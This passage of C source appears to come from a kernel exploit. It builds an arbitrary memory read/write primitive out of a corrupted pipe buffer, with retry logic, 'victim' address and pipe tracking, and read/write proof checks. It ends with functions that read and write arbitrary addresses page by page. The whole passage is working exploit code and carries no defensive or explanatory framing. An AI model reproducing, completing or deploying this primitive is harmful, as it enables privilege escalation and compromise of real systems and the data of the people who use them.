        prepare_timeout_ms = OSS_PIPE_PREPARE_TIMEOUT_MS;
      }
      atomic_store_explicit(&g_prepare_timeout_ms, prepare_timeout_ms,
                            memory_order_release);
      atomic_store_explicit(&g_prepare_request, 1, memory_order_release);
      unsigned int wait_ticks = 0;
      while (!atomic_load_explicit(&g_prepare_done, memory_order_acquire)) {
        usleep(10000);
        /* Production's v14 main loop services the request within its 10-ms
         * poll. Standalone compatibility harnesses have no such loop; after
         * five seconds, service only a request nobody else has claimed. */
        if (++wait_ticks >= 500 &&
            atomic_load_explicit(&g_prepare_request, memory_order_acquire)) {
          oss_pipe_rw_service_pending();
        }
      }
    }
    struct pipe_attempt_diag diag = g_prepare_diag;
    enum pipe_error error = diag.error;
    uint64_t establish_started_ms = monotonic_ms();
    if (atomic_load_explicit(&g_prepare_ok, memory_order_acquire) &&
        establish_pipe_rw(fd, &error)) {
      fprintf(stderr,
              "[pipe_rw] ready attempt=%d/%d page=%016llx victim=%016llx "
              "pipe=%d prepare_ms=%llu establish_ms=%llu total_ms=%llu\n",
              attempt, OSS_PIPE_ATTEMPTS,
              (unsigned long long)g_pipe_page_base,
              (unsigned long long)g_victim_addr, g_victim_pipe,
              (unsigned long long)diag.elapsed_ms,
              (unsigned long long)(monotonic_ms() - establish_started_ms),
              (unsigned long long)(monotonic_ms() - install_started_ms));
      return 1;
    }
    if (error == PIPE_E_NONE) {
      error = PIPE_E_PREPARE;
    }
    enum pipe_prepare_stage failed_stage = diag.stage;
    int failed_errno = diag.error_no;
    uint64_t attempt_ms = diag.elapsed_ms +
                          (monotonic_ms() - establish_started_ms);
    if (error == PIPE_E_RESTORE) {
      fprintf(stderr,
              "[pipe_rw] terminal failure attempt=%d/%d reason=%s stage=%s "
              "errno=%d elapsed_ms=%llu; preserving pipes\n",
              attempt, OSS_PIPE_ATTEMPTS, pipe_error_name(error),
              pipe_stage_name(failed_stage), failed_errno,
              (unsigned long long)attempt_ms);
      return 0;
    }
    oss_pipe_rw_reset();
    fprintf(stderr,
            "[pipe_rw] setup miss attempt=%d/%d reason=%s stage=%s errno=%d "
            "elapsed_ms=%llu\n",
            attempt, OSS_PIPE_ATTEMPTS, pipe_error_name(error),
            pipe_stage_name(failed_stage), failed_errno,
            (unsigned long long)attempt_ms);
    if (error == PIPE_E_READ_PROOF || error == PIPE_E_WRITE_PROOF) {
      usleep((useconds_t)(attempt * 2000));
    } else if (error == PIPE_E_CACHE_SELECT) {
      usleep((useconds_t)(attempt * 4000));
    } else {
      sched_yield();
    }
  }
  oss_pipe_rw_reset();
  return 0;
}

int oss_pipe_rw_read(int fd, uint64_t addr, void *buf, size_t len) {
  if (!g_installed || (!buf && len)) {
    return 0;
  }
  unsigned char *cursor = buf;
  while (len) {
    size_t chunk = OSS_PAGE_SIZE - (size_t)(addr & OSS_PAGE_MASK);
    if (chunk > len) {
      chunk = len;
    }
    if (!pipe_rw_read_once(fd, addr, cursor, chunk)) {
      return 0;
    }
    cursor += chunk;
    addr += chunk;
    len -= chunk;
  }
  return 1;
}

int oss_pipe_rw_write(int fd, uint64_t addr, const void *buf, size_t len) {
  if (!g_installed || (!buf && len)) {
    return 0;
  }
  const unsigned char *cursor = buf;
  while (len) {
    size_t chunk = OSS_PAGE_SIZE - (size_t)(addr & OSS_PAGE_MASK);
    if (chunk > len) {
      chunk = len;
    }
    if (!pipe_rw_write_once(fd, addr, cursor, chunk)) {
      return 0;
    }
    cursor += chunk;
    addr += chunk;
    len -= chunk;
  }
  return 1;
}
